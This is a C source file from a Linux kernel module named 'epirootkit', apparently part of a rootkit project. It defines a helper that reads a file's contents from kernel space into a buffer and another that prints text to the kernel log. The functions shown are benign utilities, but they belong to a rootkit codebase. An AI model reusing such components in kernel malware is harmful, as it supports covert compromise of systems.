#include <linux/fs.h>
#include <linux/kernel.h>
#include "epirootkit.h"

/**
 * @brief Reads the content of a file into a dynamically allocated buffer.
 *
 * @param filename The name of the file to read.
 * @return char* - Returns a pointer to the buffer containing the file content, or NULL on failure.
 *                 The caller is responsible for freeing the allocated buffer.
 */
char *read_file(char *filename)
{
	struct file *file = NULL;
	char *buf = NULL;
	loff_t pos = 0;
	int len = 0;

	// Open the file for reading
	file = filp_open(filename, O_RDONLY, 0);
	if (IS_ERR(file)) {
		pr_err("epirootkit: read_file: failed to open file %s\n", filename);
		return NULL;
	}

	// Allocate memory for the buffer
	buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
	if (!buf) {
		filp_close(file, NULL);
		return NULL;
	}

	// Read the file content into the buffer
	len = kernel_read(file, buf, STD_BUFFER_SIZE - 1, &pos);
	if (len < 0) {
		kfree(buf);
		filp_close(file, NULL);
		return NULL;
	}

	buf[len] = '\0'; // Null-terminate the string
	filp_close(file, NULL);
	return buf;
}

/**
 * @brief Prints the content of a buffer to the kernel log.
 *
 * @param content The content to print.
 * @param level The log level to use for printing (INFO, WARN, ERR, CRIT).
 */
void print_file(char *content, enum text_level level)
{
	if (!content) {
		pr_err("epirootkit: print_file: content is NULL\n");
		return;
	}

	// Print the content based on the specified log level
	switch (level) {
	case WARN:
		pr_warn("%s", content);
		break;
	case ERR:
		pr_err("%s", content);
		break;
	case CRIT:
		pr_crit("%s", content);
		break;
	default:
		pr_info("%s", content);
		break;
	}
}